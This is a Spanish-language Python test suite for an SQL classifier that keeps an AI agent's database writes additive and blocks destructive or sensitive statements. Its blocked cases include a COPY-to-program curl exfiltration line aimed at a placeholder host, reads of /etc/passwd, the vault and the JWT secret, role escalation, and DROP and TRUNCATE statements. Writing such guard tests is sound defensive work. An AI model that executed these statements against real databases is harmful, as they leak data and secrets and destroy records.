#!/usr/bin/env python3
# == VIDEOJUEGOSZARAGOZA ====================================================
# Archivo:        infraestructura/base-datos/test_clasificador.py (copia adaptada de VeoAura, commit eb5f74fc;
#                 los casos de tablas de la tienda siguen la regla del dueño del 2026-11-27)
# Función:        Batería del clasificador SQL de vz-sql: casos aditivos que deben pasar y
#                 casos destructivos, sensibles, de SQL dinámico o no reconocidos que deben quedar
#                 en «requiere_accion_manual». Usa un catálogo simulado (no toca ninguna base).
# Para qué sirve: Demostrar que DELETE, DROP, TRUNCATE, ALTER … DROP, RENAME, MERGE, DO, COPY,
#                 CREATE OR REPLACE existente, SECURITY DEFINER, GRANT peligroso, UPDATE sin WHERE,
#                 SQL dinámico, llamadas a funciones/RPC existentes de la aplicación y ACCION_MANUAL
#                 quedan bloqueados, y que el D8 aprobado sigue pasando como lectura.
# Conectado con:  clasificador.py y diagnostico_d8.sql (misma carpeta).
# Utilizado por:  instalar-sql.sh; a mano: python3 infraestructura/hetzner/supabase/test_clasificador.py
#                 (opcional --lib <carpeta con pglast> si aún no está instalado en /opt/vz-sql/lib).
# Dependencias:   python3, pglast 7.18.
# Estado:         ACTIVO
# ============================================================================
import os
import sys

AQUI = os.path.dirname(os.path.abspath(__file__))
if "--lib" in sys.argv:
    os.environ["VZ_SQL_LIB"] = sys.argv[sys.argv.index("--lib") + 1]
sys.dont_write_bytecode = True
sys.path.insert(0, AQUI)
import clasificador as c  # noqa: E402


class CatalogoSimulado:
    relaciones = {("public", "profiles"), ("public", "vz_ops_tareas"), ("public", "tabla_agente"),
                  ("public", "vista_existente")}
    del_agente = {("public", "tabla_agente"), ("public", "vz_ops_tareas")}
    # Funciones existentes. Del agente (sin SECURITY DEFINER): tocar y f_agente. De la aplicación:
    # registrar_venta (RPC que escribe en sales), es_admin, upper (sombrea a la del sistema) y
    # f_agente_definer (del agente, pero SECURITY DEFINER: no es segura).
    funciones = {("public", "funcion_existente"), ("public", "tocar"), ("public", "f_agente"),
                 ("public", "registrar_venta"), ("public", "es_admin"), ("public", "upper"),
                 ("public", "f_agente_definer"), ("pg_catalog", "upper"), ("pg_catalog", "count")}
    funciones_agente = {("public", "tocar"), ("public", "f_agente")}
    nombres_aplicacion = {"funcion_existente", "registrar_venta", "es_admin", "upper", "f_agente_definer"}
    operadores_aplicacion = {"&&"}
    triggers = {("public", "tabla_agente", "trigger_existente")}

    def existe_relacion(self, e, n):
        return (e, n) in self.relaciones

    def es_del_agente(self, e, n):
        return (e, n) in self.del_agente

    def existe_funcion(self, e, n):
        return (e, n) in self.funciones

    def es_funcion_del_agente(self, e, n):
        return (e, n) in self.funciones_agente

    def funcion_de_aplicacion(self, n):
        return n in self.nombres_aplicacion

    def operador_de_aplicacion(self, o):
        return o in self.operadores_aplicacion

    def existe_trigger(self, e, t, n):
        return (e, t, n) in self.triggers


class CatalogoAntiguo:
    """Catálogo que no sabe responder sobre funciones: el clasificador debe fallar cerrado."""

    def existe_relacion(self, e, n):
        return False

    def es_del_agente(self, e, n):
        return False

    def existe_funcion(self, e, n):
        return False

    def existe_trigger(self, e, t, n):
        return False


CAT = CatalogoSimulado()
P, M, E = "permitida", "manual", "error"

CASOS = [
    # ===================================================== PERMITIDOS (aplicar)
    ("aplicar", "select 1", P),
    ("aplicar", "select * from profiles where id = '1'", P),
    ("aplicar", "with x as (select 1) select * from x", P),
    ("aplicar", "explain select * from profiles", P),
    ("aplicar", "show search_path", P),
    ("aplicar", "select auth.uid()", P),
    ("aplicar", "create table if not exists public.vz_ops_eventos (id uuid primary key default "
                "gen_random_uuid(), titulo text not null check (char_length(titulo) <= 200))", P),
    ("aplicar", "create table vz_pruebas.t (id int)", P),
    ("aplicar", "create index if not exists i on vz_ops_tareas (titulo)", P),
    ("aplicar", "create index concurrently if not exists i2 on vz_ops_tareas (titulo)", P),
    ("aplicar", "create view v_nueva as select 1 as x", P),
    ("aplicar", "create or replace view v_nueva2 as select 1 as x", P),
    ("aplicar", "create function f_nueva() returns int language sql as $$ select 1 $$", P),
    ("aplicar", "create or replace function f_nueva2() returns int language sql as $$ select 1 $$", P),
    ("aplicar", "create function tocar2() returns trigger language plpgsql set search_path = '' as $$ "
                "begin new.updated_at = now(); return new; end $$", P),
    ("aplicar", "create function contar(p int) returns int language plpgsql as $$ declare v int; begin "
                "v := p + 1; select count(*) into v from vz_ops_tareas; return v; end $$", P),
    ("aplicar", "create function registrar(t text) returns void language plpgsql as $$ begin "
                "insert into vz_ops_tareas (titulo) values (t); end $$", P),
    ("aplicar", "create trigger tr before update on vz_ops_tareas for each row execute function tocar()", P),
    ("aplicar", "create type ops_estado as enum ('a', 'b')", P),
    ("aplicar", "create domain d_correo as text check (value like '%@%')", P),
    ("aplicar", "create sequence s1", P),
    ("aplicar", "comment on table vz_ops_tareas is 'Tareas'", P),
    ("aplicar", "alter type ops_estado add value if not exists 'c'", P),
    ("aplicar", "alter table vz_ops_tareas add column if not exists prioridad int default 0", P),
    ("aplicar", "alter table vz_ops_tareas add constraint c1 check (prioridad >= 0)", P),
    ("aplicar", "alter table vz_ops_tareas add constraint fk1 foreign key (creada_por) references "
                "auth.users (id) on delete set null", P),
    ("aplicar", "alter table vz_ops_tareas alter column prioridad set default 1", P),
    ("aplicar", "alter table vz_ops_tareas alter column prioridad set not null", P),
    ("aplicar", "alter table vz_ops_tareas enable row level security", P),
    ("aplicar", "alter table vz_ops_tareas force row level security", P),
    ("aplicar", "alter table vz_ops_tareas validate constraint c1", P),
    ("aplicar", "alter table vz_ops_tareas add column a int, add column b text", P),
    ("aplicar", "create policy p1 on vz_ops_tareas for select to authenticated "
                "using (creada_por = auth.uid())", P),
    ("aplicar", "create policy p_srv on vz_ops_tareas for all to service_role using (creada_por is not null)", P),
    ("aplicar", "revoke all on vz_ops_tareas from anon, authenticated", P),
    ("aplicar", "revoke execute on function f_nueva() from public", P),
    ("aplicar", "grant select, insert, update on vz_ops_tareas to service_role", P),
    ("aplicar", "grant execute on function f_nueva() to service_role", P),
    ("aplicar", "insert into vz_ops_tareas (titulo) values ('x')", P),
    ("aplicar", "insert into tabla_agente values (1)", P),
    ("aplicar", "update vz_ops_tareas set titulo = 'y' where id = 1", P),
    ("aplicar", "insert into vz_ops_tareas (id, titulo) values (1, 'x') on conflict (id) do update "
                "set titulo = excluded.titulo", P),
    ("aplicar", "create table nueva (id int); insert into nueva values (1); "
                "update nueva set id = 2 where id = 1", P),
    ("aplicar", "select * from profiles for update", P),
    ("aplicar", "select 'año ñandú' as texto; create table t_utf (nombre text default 'canción')", P),
    # Funciones seguras: del sistema (lista segura) y las creadas por vz-sql
    ("aplicar", "select lower(titulo), count(*), max(id), date_trunc('day', now()) from vz_ops_tareas "
                "group by 1", P),
    ("aplicar", "select jsonb_build_object('a', 1) ->> 'a', coalesce(null, 1), extract(year from now())", P),
    ("aplicar", "select pg_catalog.upper('x')", P),
    ("aplicar", "select f_agente()", P),
    ("aplicar", "select public.f_agente(1)", P),
    ("aplicar", "create function f_agente(t text) returns int language sql as $$ select 1 $$", P),
    ("aplicar", "create function f_ops() returns int language sql as $$ select count(*)::int from "
                "vz_ops_tareas $$; select f_ops()", P),
    ("aplicar", "create function f_a() returns int language sql as $$ select 1 $$; "
                "create function f_b() returns int language sql as $$ select f_a() + 1 $$", P),
    ("aplicar", "select current_setting('server_version_num')", P),
    # ===================================================== PERMITIDOS (lectura)
    ("lectura", "select count(*) from profiles", P),
    ("lectura", "with x as (select 1 as a) select a from x", P),
    ("lectura", "explain select 1", P),
    ("lectura", "show server_version", P),
    ("lectura", "select relname from pg_catalog.pg_class where relname like 'vz%' order by 1", P),

    # ============================================================ DELETE / MERGE
    ("aplicar", "delete from vz_ops_tareas where id = 1", M),
    ("aplicar", "DELETE FROM vz_ops_tareas", M),
    ("aplicar", "with d as (delete from vz_ops_tareas returning *) select * from d", M),
    ("aplicar", "merge into vz_ops_tareas t using tabla_agente s on t.id = s.id when matched then delete", M),
    ("aplicar", "merge into vz_ops_tareas t using tabla_agente s on t.id = s.id "
                "when matched then update set titulo = 'x'", M),
    # ===================================================================== DROP
    ("aplicar", "drop table vz_ops_tareas", M),
    ("aplicar", "drop table if exists x", M),
    ("aplicar", "DrOp TaBlE x", M),
    ("aplicar", "/* inocente */ drop table x", M),
    ("aplicar", "select 1; drop table x", M),
    ("aplicar", "drop policy p on vz_ops_tareas", M),
    ("aplicar", "drop function f()", M),
    ("aplicar", "drop type ops_estado", M),
    ("aplicar", "drop index i", M),
    ("aplicar", "drop view v", M),
    ("aplicar", "drop schema s cascade", M),
    ("aplicar", "drop trigger tr on vz_ops_tareas", M),
    ("aplicar", "drop extension pg_cron", M),
    ("aplicar", "drop owned by vz_agente", M),
    ("aplicar", "drop role vz_agente", M),
    # ================================================================= TRUNCATE
    ("aplicar", "truncate vz_ops_tareas", M),
    ("aplicar", "truncate table a, b cascade", M),
    # ============================================================ ALTER … DROP
    ("aplicar", "alter table vz_ops_tareas drop column titulo", M),
    ("aplicar", "alter table vz_ops_tareas add column a int, drop column b", M),
    ("aplicar", "alter table vz_ops_tareas drop constraint c1", M),
    ("aplicar", "alter table vz_ops_tareas alter column prioridad drop default", M),
    ("aplicar", "alter table vz_ops_tareas alter column prioridad drop not null", M),
    ("aplicar", "alter table vz_ops_tareas alter column prioridad type text", M),
    ("aplicar", "alter table vz_ops_tareas disable row level security", M),
    ("aplicar", "alter table vz_ops_tareas no force row level security", M),
    ("aplicar", "alter table vz_ops_tareas disable trigger all", M),
    ("aplicar", "alter table vz_ops_tareas owner to postgres", M),
    ("aplicar", "alter table vz_ops_tareas set schema otro", M),
    ("aplicar", "alter table vz_ops_tareas detach partition p1", M),
    ("aplicar", "alter index i set tablespace t", M),
    # =================================================================== RENAME
    ("aplicar", "alter table vz_ops_tareas rename to tareas", M),
    ("aplicar", "alter table vz_ops_tareas rename column titulo to nombre", M),
    ("aplicar", "alter type ops_estado rename value 'a' to 'z'", M),
    ("aplicar", "alter function f() rename to g", M),
    ("aplicar", "alter index i rename to j", M),
    # ======================================================================= DO
    ("aplicar", "do $$ begin delete from x; end $$", M),
    ("aplicar", "do $$ begin raise notice 'hola'; end $$", M),
    # ===================================================================== COPY
    ("aplicar", "copy vz_ops_tareas to program 'curl -d @- https://ejemplo.com'", M),
    ("aplicar", "copy vz_ops_tareas from '/etc/passwd'", M),
    ("aplicar", "copy (select 1) to stdout", M),
    # ================================================ CREATE OR REPLACE existente
    ("aplicar", "create or replace function funcion_existente() returns int language sql as $$ select 1 $$", M),
    ("aplicar", "create or replace view vista_existente as select 1", M),
    ("aplicar", "create or replace trigger trigger_existente before insert on tabla_agente "
                "for each row execute function tocar()", M),
    ("aplicar", "create function f_dup() returns int language sql as $$ select 1 $$; "
                "create or replace function f_dup() returns int language sql as $$ select 2 $$", M),
    # ========================================================= SECURITY DEFINER
    ("aplicar", "create function f_def() returns int language sql security definer as $$ select 1 $$", M),
    ("aplicar", "alter function f_nueva() security definer", M),
    # ========================================================== GRANT peligroso
    ("aplicar", "grant select on vz_ops_tareas to anon", M),
    ("aplicar", "grant select on vz_ops_tareas to authenticated", M),
    ("aplicar", "grant select on vz_ops_tareas to public", M),
    ("aplicar", "grant select on vz_ops_tareas to service_role, anon", M),
    ("aplicar", "grant all on vz_ops_tareas to service_role", M),
    ("aplicar", "grant delete on vz_ops_tareas to service_role", M),
    ("aplicar", "grant truncate on vz_ops_tareas to service_role", M),
    ("aplicar", "grant select on vz_ops_tareas to service_role with grant option", M),
    ("aplicar", "grant select on vz_ops_tareas to otro_rol", M),
    ("aplicar", "grant service_role to vz_agente", M),
    ("aplicar", "alter default privileges grant select on tables to anon", M),
    ("aplicar", "revoke select on vz_ops_tareas from service_role", M),
    # =========================================================== UPDATE sin WHERE
    ("aplicar", "update vz_ops_tareas set titulo = 'x'", M),
    ("aplicar", "update vz_ops_tareas set titulo = 'x' where true", M),
    ("aplicar", "update vz_ops_tareas set titulo = 'x' where 1 = 1", M),
    ("aplicar", "update vz_ops_tareas set titulo = 'x' where 't'::boolean", M),
    ("aplicar", "explain analyze update vz_ops_tareas set titulo = 'x'", M),
    # ======= datos en tablas de la tienda (dueño de VideojuegosZaragoza, 2026-11-27): INSERT y UPDATE
    #         limitados como sentencia principal; nada de CTEs, funciones, upsert ni DELETE.
    ("aplicar", "insert into profiles (id) values ('x')", P),
    ("aplicar", "insert into public.profiles (id) select 'x' where not exists (select 1 from profiles where id = 'x')", P),
    ("aplicar", "insert into profiles (id) values ('x') on conflict do nothing", P),
    ("aplicar", "update profiles set plan = 'pro' where id = 'x'", P),
    ("aplicar", "update public.profiles p set plan = jsonb_set('{}'::jsonb, '{a}', to_jsonb('b'::text))::text "
                "where p.id = 'x' and p.plan not like '%pro%'", P),
    ("aplicar", "update profiles set plan = 'pro'", M),
    ("aplicar", "update profiles set plan = 'pro' where true", M),
    ("aplicar", "insert into profiles (id) values ('x') on conflict (id) do update set plan = 'pro'", M),
    ("aplicar", "with u as (update profiles set plan = 'pro' where id = 'x' returning *) select * from u", M),
    ("aplicar", "with u as (insert into profiles (id) values ('x') returning *) select * from u", M),
    ("aplicar", "delete from profiles where id = 'x'", M),
    ("aplicar", "truncate profiles", M),
    ("aplicar", "insert into stock_items (nombre) values ('x')", M),
    ("aplicar", "insert into auth.users (id) values ('x')", M),
    ("aplicar", "update storage.objects set name = 'x' where id = 'x'", M),
    ("lectura", "update profiles set plan = 'pro' where id = 'x'", M),
    ("lectura", "insert into profiles (id) values ('x')", M),
    # ================================================================ SQL dinámico
    ("aplicar", "create function f_dyn() returns void language plpgsql as $$ begin execute 'drop table x'; end $$", M),
    ("aplicar", "create function f_dyn2() returns void language plpgsql as $$ declare r record; begin "
                "for r in execute 'select 1' loop end loop; end $$", M),
    ("aplicar", "create function f_open() returns void language plpgsql as $$ declare c refcursor; begin "
                "open c for execute 'select 1'; end $$", M),
    ("aplicar", "create function f_rq() returns setof int language plpgsql as $$ begin "
                "return query execute 'select 1'; end $$", M),
    ("aplicar", "select query_to_xml('select * from profiles', true, true, '')", M),
    ("aplicar", "create function f_sqldel() returns void language sql as $$ delete from vz_ops_tareas $$", M),
    ("aplicar", "create function f_pldel() returns void language plpgsql as $$ begin "
                "delete from vz_ops_tareas where id = 1; end $$", M),
    ("aplicar", "create function f_pldrop() returns void language plpgsql as $$ begin drop table x; end $$", M),
    ("aplicar", "create function f_plupd() returns void language plpgsql as $$ begin "
                "update vz_ops_tareas set titulo = 'x'; end $$", M),
    ("aplicar", "create function f_plbiz() returns void language plpgsql as $$ begin "
                "update profiles set plan = 'pro' where id = 'x'; end $$", M),
    ("aplicar", "create function f_call() returns void language plpgsql as $$ begin call p(); end $$", M),
    ("aplicar", "create function f_perf() returns void language plpgsql as $$ begin "
                "perform pg_terminate_backend(1); end $$", M),
    ("aplicar", "create function f_asig() returns void language plpgsql as $$ declare v text; begin "
                "v := set_config('role', 'postgres', true); end $$", M),
    ("aplicar", "create function f_c() returns int language c as 'libx', 'f'", M),
    ("aplicar", "create function f_py() returns int language plpython3u as $$ return 1 $$", M),
    ("aplicar", "create function f_atom() returns void language sql begin atomic delete from vz_ops_tareas; end", M),
    # ===================================================== funciones y esquemas prohibidos
    ("aplicar", "select pg_terminate_backend(1)", M),
    ("aplicar", "select pg_read_file('/etc/passwd')", M),
    ("aplicar", "select pg_ls_dir('.')", M),
    ("aplicar", "select lo_import('/etc/passwd')", M),
    ("aplicar", "select set_config('role', 'postgres', false)", M),
    ("aplicar", "select cron.schedule('x', '* * * * *', 'select 1')", M),
    ("aplicar", "select net.http_get('https://ejemplo.com')", M),
    ("aplicar", "select dblink_exec('x', 'drop table y')", M),
    ("aplicar", "create table t_mal (id int default pg_terminate_backend(1))", M),
    ("lectura", "select * from vault.decrypted_secrets", M),
    ("lectura", "select jobname, command from cron.job", M),
    ("lectura", "select * from supabase_migrations.schema_migrations", M),
    ("aplicar", "create view v_mal as select pg_read_file('/etc/passwd')", M),
    # ================================== RPC y funciones existentes de la aplicación (F1.2)
    # RPC existente que escribe (p. ej. registra una venta): ni en lectura ni en aplicar, ni anidada
    ("lectura", "select public.registrar_venta(1)", M),
    ("lectura", "select registrar_venta(1)", M),
    ("aplicar", "select registrar_venta(1)", M),
    ("lectura", "select * from registrar_venta(1)", M),
    ("lectura", "select count(*) from vz_ops_tareas where registrar_venta(id) is not null", M),
    ("lectura", "with x as (select registrar_venta(1)) select 1", M),
    ("lectura", "explain select registrar_venta(1)", M),
    ("aplicar", "insert into vz_ops_tareas (titulo) select registrar_venta(1)::text", M),
    ("aplicar", "update vz_ops_tareas set titulo = registrar_venta(1)::text where id = 1", M),
    ("aplicar", "create view v_rpc as select registrar_venta(1)", M),
    ("aplicar", "create table vz_ops_d (id int default registrar_venta(1))", M),
    ("aplicar", "create index i_rpc on vz_ops_tareas (registrar_venta(id))", M),
    ("aplicar", "create policy p_rpc on vz_ops_tareas for select to authenticated using (es_admin())", M),
    ("aplicar", "create function f_envuelve() returns int language sql as $$ select registrar_venta(1) $$", M),
    ("aplicar", "create function f_envuelve2() returns void language plpgsql as $$ begin "
                "perform registrar_venta(1); end $$", M),
    ("aplicar", "create function f_envuelve3() returns void language plpgsql as $$ declare v int; begin "
                "v := registrar_venta(1); end $$", M),
    # SECURITY DEFINER existente: nunca, aunque sea del agente
    ("lectura", "select f_agente_definer()", M),
    ("aplicar", "select public.f_agente_definer()", M),
    # Funciones desconocidas o de otros esquemas: falla cerrado
    ("lectura", "select funcion_que_no_existe()", M),
    ("lectura", "select extensions.uuid_generate_v4()", M),
    ("lectura", "select pg_sleep(10)", M),
    ("aplicar", "select nextval('s1')", M),
    ("aplicar", "select pg_notify('canal', 'x')", M),
    ("lectura", "select pg_catalog.pg_get_functiondef(1)", M),
    # Sombra de una función del sistema por una de la aplicación
    ("lectura", "select upper('x')", M),
    # Sobrecargar una función existente de la aplicación
    ("aplicar", "create function registrar_venta(t text) returns int language sql as $$ select 1 $$", M),
    # Triggers: solo en tablas del sistema y con una función del agente
    ("aplicar", "create trigger tr_biz before insert on profiles for each row execute function tocar()", M),
    ("aplicar", "create trigger tr_rpc before insert on vz_ops_tareas for each row "
                "execute function registrar_venta()", M),
    ("aplicar", "create trigger tr_def before insert on vz_ops_tareas for each row "
                "execute function f_agente_definer()", M),
    # Operadores: solo del sistema y sin redefinir por la aplicación
    ("lectura", "select 1 === 2", M),
    ("lectura", "select 1 operator(public.+) 2", M),
    ("lectura", "select array[1] && array[2]", M),
    # Ajustes y vistas del sistema con secretos
    ("lectura", "select current_setting('app.settings.jwt_secret')", M),
    ("lectura", "select current_setting(x) from vz_ops_tareas", M),
    ("lectura", "show app.settings.jwt_secret", M),
    ("lectura", "show all", M),
    ("lectura", "select name, setting from pg_settings", M),
    ("lectura", "select * from pg_catalog.pg_stat_activity", M),
    # ================================================================ sesión y otros
    ("aplicar", "set role postgres", M),
    ("aplicar", "reset role", M),
    ("aplicar", "set search_path = otro", M),
    ("aplicar", "begin", M),
    ("aplicar", "commit", M),
    ("aplicar", "lock table vz_ops_tareas", M),
    ("aplicar", "vacuum full vz_ops_tareas", M),
    ("aplicar", "create extension if not exists http", M),
    ("aplicar", "create rule r as on delete to vz_ops_tareas do instead nothing", M),
    ("aplicar", "create schema s", M),
    ("aplicar", "call p()", M),
    ("aplicar", "prepare q as select 1", M),
    ("aplicar", "execute q", M),
    ("aplicar", "alter system set log_statement = 'none'", M),
    ("aplicar", "create role r login", M),
    ("aplicar", "alter role vz_agente superuser", M),
    ("aplicar", "listen canal", M),
    ("aplicar", "create event trigger e on ddl_command_start execute function f()", M),
    ("aplicar", "alter policy p on vz_ops_tareas using (true)", M),
    ("aplicar", "refresh materialized view mv", M),
    ("aplicar", "create table auth.x (id int)", M),
    ("aplicar", "create function storage.f() returns int language sql as $$ select 1 $$", M),
    ("aplicar", "create index concurrently i3 on vz_ops_tareas (titulo); select 1", M),
    # ================================================================ políticas (D3)
    ("aplicar", "create policy p3 on profiles for select to authenticated using (id = auth.uid())", M),
    ("aplicar", "create policy p4 on vz_ops_tareas for select using (creada_por = auth.uid())", M),
    ("aplicar", "create policy p5 on vz_ops_tareas for select to anon using (creada_por = auth.uid())", M),
    ("aplicar", "create policy p6 on vz_ops_tareas for select to authenticated using (true)", M),
    ("aplicar", "create policy p7 on vz_ops_tareas for insert to authenticated with check ('t'::boolean)", M),
    ("aplicar", "create policy p8 on vz_ops_tareas for select to public using (creada_por = auth.uid())", M),
    ("aplicar", "create policy p9 on vz_ops_tareas for all to service_role using (1 = 1)", M),
    # ======================================================= lectura: nada que escriba
    ("lectura", "create table x (id int)", M),
    ("lectura", "insert into vz_ops_tareas (titulo) values ('x')", M),
    ("lectura", "update vz_ops_tareas set titulo = 'x' where id = 1", M),
    ("lectura", "with u as (insert into vz_ops_tareas (titulo) values ('x') returning *) select * from u", M),
    ("lectura", "select * from profiles for update", M),
    ("lectura", "select 1 into tabla_nueva", M),
    ("lectura", "explain analyze delete from vz_ops_tareas", M),
    ("lectura", "grant select on vz_ops_tareas to service_role", M),
    # ================================================================ ACCION_MANUAL y errores
    ("aplicar", "-- VZ: ACCION_MANUAL\nselect 1", E),
    ("aplicar", "select 1; -- vz : accion_manual", E),
    ("lectura", "--VZ:ACCION_MANUAL\nselect 1", E),
    ("aplicar", "selec 1", E),
    ("aplicar", "", E),
    ("aplicar", "-- solo un comentario", E),
]

fallos = 0
for modo, sql, esperado in CASOS:
    r = c.clasificar(sql, CAT, modo)
    obtenido = E if r.error else (P if r.permitido else M)
    if obtenido != esperado:
        fallos += 1
        motivos = "; ".join(s.motivo for s in r.bloqueadas()) or r.error
        print(f"FALLO  [{modo}] esperado={esperado} obtenido={obtenido}  {sql[:110]!r}  → {motivos}")

# Falla cerrado: un catálogo que no sabe responder sobre funciones bloquea cualquier llamada.
if c.clasificar("select count(*) from vz_ops_tareas", CatalogoAntiguo(), "lectura").permitido:
    fallos += 1
    print("FALLO  con un catálogo incompleto una llamada a función no debe permitirse")

# El D8 aprobado (diagnostico_d8.sql) sigue siendo lectura permitida con las nuevas reglas.
with open(os.path.join(AQUI, "diagnostico_d8.sql"), encoding="utf-8") as f:
    r = c.clasificar(f.read(), CAT, "lectura")
if not r.permitido:
    fallos += 1
    print(f"FALLO  el D8 debería pasar como lectura: {'; '.join(s.motivo for s in r.bloqueadas()) or r.error}")

# Nombres de archivo ACCION_MANUAL
for nombre, contenido, esperado in [
    ("documentacion/acciones-manuales/ACCION_MANUAL__BORRAR_X__2026-10-09.sql", "select 1", True),
    ("accion_manual__borrar_x.sql", "select 1", True),
    ("migracion.sql", "-- VZ: ACCION_MANUAL\nselect 1", True),
    ("migracion.sql", "select 1", False),
]:
    if c.es_archivo_accion_manual(nombre, contenido) != esperado:
        fallos += 1
        print(f"FALLO  es_archivo_accion_manual({nombre!r}) != {esperado}")

# La plantilla de acción manual nunca es ejecutable: lleva la marca y el SQL comentado.
bloqueada = c.clasificar("drop table vz_ops_tareas", CAT, "aplicar").sentencias[0]
plantilla = c.plantilla_accion_manual(bloqueada, "documentacion/x.sql", "2026-10-09")
nombre = c.nombre_archivo_accion_manual(bloqueada, "2026-10-09")
if not (nombre.startswith("ACCION_MANUAL__BORRAR_") and nombre.endswith("__2026-10-09.sql")):
    fallos += 1
    print(f"FALLO  nombre de acción manual inesperado: {nombre}")
if not c.es_archivo_accion_manual("x.sql", plantilla) or c.clasificar(plantilla, CAT, "aplicar").permitido:
    fallos += 1
    print("FALLO  la plantilla de acción manual podría ejecutarse")
if "\ndrop table" in plantilla.lower():
    fallos += 1
    print("FALLO  la plantilla contiene el SQL destructivo sin comentar")

# El texto ejecutable es exactamente cada sentencia (también con caracteres multibyte).
r = c.clasificar("select 'año' as x;\n-- comentario ñ\ncreate table t_ñ (nombre text default 'canción');", CAT, "aplicar")
# (libpg_query incluye en la sentencia el comentario que la precede; ejecutarlo no tiene efecto)
if [s.texto for s in r.sentencias] != ["select 'año' as x",
                                        "-- comentario ñ\ncreate table t_ñ (nombre text default 'canción')"]:
    fallos += 1
    print(f"FALLO  recorte de sentencias: {[s.texto for s in r.sentencias]}")

total = len(CASOS) + 2 + 4 + 3 + 1
print(f"{total - fallos}/{total} comprobaciones correctas (pglast {c.pglast.__version__}, "
      f"parser PostgreSQL {'.'.join(map(str, c.pglast.get_postgresql_version()))})")
sys.exit(1 if fallos else 0)
